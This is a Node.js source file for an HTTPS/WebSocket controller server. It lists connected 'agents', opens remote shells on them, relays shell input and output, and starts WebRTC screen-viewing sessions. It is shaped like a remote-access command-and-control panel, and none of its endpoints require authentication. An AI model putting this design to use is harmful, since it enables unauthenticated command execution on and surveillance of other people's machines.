const fs = require('fs');
const https = require('https');
const path = require('path');
const { randomUUID } = require('crypto');
const WebSocket = require('ws');

const CERT_DIR = path.join(__dirname, 'certs');
const PORT = process.env.PORT ? Number(process.env.PORT) : 8443;

const certPath = path.join(CERT_DIR, 'server.crt');
const keyPath = path.join(CERT_DIR, 'server.key');

if (!fs.existsSync(certPath) || !fs.existsSync(keyPath)) {
  console.error('TLS certificate not found.');
  console.error(`Place server.crt and server.key in ${CERT_DIR}`);
  process.exit(1);
}

const PUBLIC_DIR = path.join(__dirname, 'public');
const server = https.createServer({
  cert: fs.readFileSync(certPath),
  key: fs.readFileSync(keyPath),
});

const clients = new Map(); // socket -> info
const clientsById = new Map(); // id -> { socket, info }
const shellStreams = new Map(); // id -> response
const screenSessions = new Map(); // sessionId -> session data

server.on('request', (req, res) => {
  const requestedUrl = new URL(req.url ?? '/', `https://${req.headers.host ?? 'localhost'}`);
  const pathname = requestedUrl.pathname;

  if (pathname === '/clients' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    const payload = Array.from(clients.values()).map((info) => ({
      id: info.id,
      name: info.name,
      connectedAt: info.connectedAt,
      remoteAddress: info.remoteAddress,
    }));
    return res.end(JSON.stringify(payload));
  }

  const shellStreamMatch = pathname.match(/^\/shell\/([^/]+)$/);
  if (shellStreamMatch && req.method === 'GET') {
    const agentId = shellStreamMatch[1];
    const entry = clientsById.get(agentId);
    if (!entry) {
      res.writeHead(404);
      return res.end('Agent not found');
    }

    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      Connection: 'keep-alive',
    });
    res.write(': connected\n\n');

    shellStreams.set(agentId, res);
    res.on('close', () => {
      shellStreams.delete(agentId);
      sendControl(entry.socket, 'stop-shell');
    });

    sendControl(entry.socket, 'start-shell');
    return;
  }

  const shellInputMatch = pathname.match(/^\/shell\/([^/]+)\/input$/);
  if (shellInputMatch && req.method === 'POST') {
    const agentId = shellInputMatch[1];
    const entry = clientsById.get(agentId);
    if (!entry) {
      res.writeHead(404);
      return res.end('Agent not found');
    }

    collectBody(req, (body) => {
      sendControl(entry.socket, 'shell-input', { input: body });
      res.writeHead(204);
      res.end();
    });

    return;
  }

  const screenOfferMatch = pathname.match(/^\/screen\/([^/]+)\/offer$/);
  if (screenOfferMatch && req.method === 'GET') {
    const sessionId = screenOfferMatch[1];
    const session = screenSessions.get(sessionId);
    if (!session) {
      console.warn(`Offer requested for unknown session ${sessionId}`);
      res.writeHead(404);
      return res.end('Session not found');
    }

    console.log(`Offer requested for session ${sessionId} (agent ${session.agentName}) - ready=${Boolean(session.offer)}`);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    const payloadBase = {
      sessionId,
      agentId: session.agentId,
      agentName: session.agentName,
    };

    if (!session.offer) {
      return res.end(JSON.stringify({ ...payloadBase, ready: false }));
    }

    res.end(JSON.stringify({ ...payloadBase, ...session.offer, ready: true }));
    return;
  }

  const screenEventsMatch = pathname.match(/^\/screen\/([^/]+)\/events$/);
  if (screenEventsMatch && req.method === 'GET') {
    const sessionId = screenEventsMatch[1];
    const session = screenSessions.get(sessionId);
    if (!session) {
      res.writeHead(404);
      return res.end('Session not found');
    }

    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      Connection: 'keep-alive',
    });
    res.write(': connected\n\n');
    session.sseClients.add(res);

    console.log(`Screen events client added for session ${sessionId} (agent ${session.agentName})`);
    sendScreenEvent(session, 'status', {
      sessionId,
      agentId: session.agentId,
      agentName: session.agentName,
      state: session.offer ? 'offer-ready' : 'waiting-offer',
    });

    res.on('close', () => {
      session.sseClients.delete(res);
      console.log(`Screen events disconnected for session ${sessionId}`);
      sendControl(session.socket, 'stop-screen', { sessionId });
      screenSessions.delete(sessionId);
    });

    if (session.offer) {
      sendScreenEvent(session, 'offer', session.offer);
    }

    for (const candidate of session.agentCandidates) {
      sendScreenEvent(session, 'candidate', candidate);
    }

    return;
  }

  const screenRequestMatch = pathname === '/screen/request' && req.method === 'POST';
  if (screenRequestMatch) {
    collectBody(req, (body) => {
      try {
        const { agentId } = JSON.parse(body);
        console.log(`Received screen request for agent ${agentId}`);
        const entry = clientsById.get(agentId);
        if (!entry) {
          res.writeHead(404);
          return res.end('Agent not found');
        }

        const sessionId = randomUUID();
        screenSessions.set(sessionId, {
          agentId,
          socket: entry.socket,
          agentName: entry.info.name,
          sseClients: new Set(),
          offer: null,
          agentCandidates: [],
        });

        console.log(`Sending start-screen to agent ${agentId} for session ${sessionId}`);
        sendControl(entry.socket, 'start-screen', { sessionId });
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ sessionId }));
      } catch (error) {
        res.writeHead(400);
        res.end('Invalid request');
      }
    });

    return;
  }

  const screenAnswerMatch = pathname.match(/^\/screen\/([^/]+)\/answer$/);
  if (screenAnswerMatch && req.method === 'POST') {
    const sessionId = screenAnswerMatch[1];
    const session = screenSessions.get(sessionId);
    if (!session) {
      res.writeHead(404);
      return res.end('Session not found');
    }

    collectBody(req, (body) => {
      try {
        const payload = JSON.parse(body);
        sendControl(session.socket, 'screen-answer', {
          sessionId,
          sdp: payload.sdp,
          sdpType: payload.type,
        });
        res.writeHead(204);
        res.end();
      } catch (error) {
        res.writeHead(400);
        res.end('Invalid SDP');
      }
    });

    return;
  }

  const screenCandidateMatch = pathname.match(/^\/screen\/([^/]+)\/candidate$/);
  if (screenCandidateMatch && req.method === 'POST') {
    const sessionId = screenCandidateMatch[1];
    const session = screenSessions.get(sessionId);
    if (!session) {
      res.writeHead(404);
      return res.end('Session not found');
    }

    collectBody(req, (body) => {
      try {
        const payload = JSON.parse(body);
        sendControl(session.socket, 'screen-candidate', {
          sessionId,
          candidate: payload.candidate,
          sdpMid: payload.sdpMid,
          sdpMLineIndex: payload.sdpMLineIndex,
        });
        res.writeHead(204);
        res.end();
      } catch (error) {
        res.writeHead(400);
        res.end('Invalid candidate');
      }
    });

    return;
  }

  const screenStopMatch = pathname.match(/^\/screen\/([^/]+)\/stop$/);
  if (screenStopMatch && req.method === 'POST') {
    const sessionId = screenStopMatch[1];
    const session = screenSessions.get(sessionId);
    if (!session) {
      res.writeHead(404);
      return res.end('Session not found');
    }

    sendControl(session.socket, 'stop-screen', { sessionId });
    screenSessions.delete(sessionId);
    res.writeHead(204);
    res.end();
    return;
  }

  const filePath = pathname === '/' ? '/index.html' : pathname;
  const resolved = path.join(PUBLIC_DIR, decodeURIComponent(filePath));
  if (!resolved.startsWith(PUBLIC_DIR)) {
    res.writeHead(403);
    return res.end('Forbidden');
  }

  fs.readFile(resolved, (error, data) => {
    if (error) {
      res.writeHead(404);
      return res.end('Not found');
    }

    const ext = path.extname(resolved);
    const mime = ext === '.js' ? 'application/javascript' : 'text/html';
    res.writeHead(200, { 'Content-Type': mime });
    res.end(data);
  });
});

const wss = new WebSocket.Server({ server });

wss.on('connection', (socket, request) => {
  const remote = request.socket.remoteAddress ?? 'unknown';
  const id = randomUUID();
  const info = {
    id,
    name: `unnamed (${remote})`,
    remoteAddress: remote,
    connectedAt: new Date().toISOString(),
  };

  clients.set(socket, info);
  clientsById.set(id, { socket, info });

  console.log(`Client connected from ${remote}`);
  socket.send('Welcome to the secure WebSocket server!');

  socket.on('message', (data) => {
    const payload = data.toString();
    console.log(`Received: ${payload}`);

    try {
      const parsed = JSON.parse(payload);
      if (parsed?.type === 'hello' && typeof parsed.name === 'string' && parsed.name.trim()) {
        info.name = parsed.name.trim();
        console.log(`Identified client as ${info.name}`);
      } else if (parsed?.type === 'shell-output') {
        emitShellOutput(info.id, parsed);
      } else if (parsed?.type === 'screen-offer') {
        const session = screenSessions.get(parsed.sessionId);
        if (session) {
          session.offer = {
            sdp: parsed.sdp,
            sdpType: parsed.sdpType,
          };
          console.log(`Stored screen offer for ${parsed.sessionId} (agent ${session.agentName})`);
          sendScreenEvent(session, 'offer', {
            sessionId: parsed.sessionId,
            agentId: session.agentId,
            agentName: session.agentName,
            ...session.offer,
          });
          sendScreenEvent(session, 'status', {
            sessionId: parsed.sessionId,
            agentId: session.agentId,
            agentName: session.agentName,
            state: 'offer-ready',
          });
        }
      } else if (parsed?.type === 'screen-candidate') {
        const session = screenSessions.get(parsed.sessionId);
        if (session) {
          const candidate = {
            candidate: parsed.candidate,
            sdpMid: parsed.sdpMid,
            sdpMLineIndex: parsed.sdpMLineIndex,
          };
          session.agentCandidates.push(candidate);
          console.log(`Stored screen candidate for ${parsed.sessionId}`);
          sendScreenEvent(session, 'candidate', {
            sessionId: parsed.sessionId,
            agentId: session.agentId,
            agentName: session.agentName,
            ...candidate,
          });
        }
      } else if (parsed?.type === 'screen-error') {
        const session = screenSessions.get(parsed.sessionId);
        if (session) {
          console.log(`Screen error from agent ${session.agentName}: ${parsed.message}`);
          sendScreenEvent(session, 'error', {
            sessionId: parsed.sessionId,
            agentId: session.agentId,
            agentName: session.agentName,
            message: parsed.message,
          });
        }
      }
    } catch (error) {
      // ignore invalid JSON and continue echoing
    }

    socket.send(`Echo: ${payload}`);
  });

  socket.on('close', () => {
    clients.delete(socket);
    clientsById.delete(id);
    shellStreams.delete(id);
    for (const [sessionId, session] of screenSessions) {
      if (session.agentId === id) {
        sendScreenEvent(session, 'closed', { reason: 'agent disconnected' });
        screenSessions.delete(sessionId);
      }
    }
    console.log(`Client disconnected: ${info.name}`);
  });
});

server.listen(PORT, () => {
  console.log(`HTTPS server listening on https://localhost:${PORT}`);
  console.log(`WebSocket endpoint available at wss://localhost:${PORT}`);
  console.log('Agent dashboard available via the root path');
});

function sendControl(socket, type, additional = {}) {
  if (socket.readyState !== WebSocket.OPEN) {
    console.log(`Cannot send ${type}; socket state ${socket.readyState}`);
    return;
  }

  const message = JSON.stringify({ type, ...additional });
  console.log(`sendControl ${type} -> ${message}`);
  socket.send(message);
}

function emitShellOutput(agentId, data) {
  const stream = shellStreams.get(agentId);
  if (!stream) {
    return;
  }

  const payload = {
    output: data.output,
    stream: data.stream,
    timestamp: new Date().toISOString(),
  };

  stream.write('event: shell\n');
  stream.write(`data: ${JSON.stringify(payload)}\n\n`);
}

function collectBody(req, callback) {
  let body = '';
  req.on('data', (chunk) => {
    body += chunk;
  });
  req.on('end', () => {
    callback(body);
  });
}

function sendScreenEvent(session, eventName, data) {
  const payload = JSON.stringify(data);
  console.log(`dispatching ${eventName} for ${session.agentId}`);
  for (const res of session.sseClients) {
    res.write(`event: ${eventName}\n`);
    res.write(`data: ${payload}\n\n`);
  }
}
